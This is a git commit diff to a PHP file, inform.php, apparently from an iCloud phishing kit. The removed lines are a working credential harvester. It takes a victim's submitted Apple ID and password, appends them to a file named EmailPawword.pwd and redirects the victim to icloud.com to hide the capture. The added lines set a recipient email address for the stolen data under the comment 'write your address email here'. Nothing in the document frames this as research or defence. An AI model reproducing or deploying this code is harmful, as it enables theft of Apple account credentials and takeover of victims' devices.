2d2ed3dbcee0ff4c65de3bca745a783aaddd7474
devicerecovery <31586541+devicerecovery@users.noreply.github.com>
2019-01-16 01:31:26 +0100

    Update inform.php

--- inform.php
+++ inform.php
@@ -1,18 +1,7 @@
 <?php
-if(isset($_POST['apple']) && isset($_POST['pw'])) {
-    $data = $_POST['apple'] . '=giorgi00762@mail.bg' . $_POST['pw'] . "\giorgi00762@mail.bg";
-    $ret = file_put_contents('EmailPawword.pwd', $data, FILE_APPEND | LOCK_EX);
-    if($ret === false) {
-        die('error!');
-    }
-    else {
-        echo "Done";
-    }
-}
-else {
-   die('Error');
-}
-header("Location: https://www.icloud.com");
-die();
+
+	/* write your address email here */
+
+	$email = "giorgi00762@maill.bg";
+
 ?>
-Email=giorgi00762@mail.bg
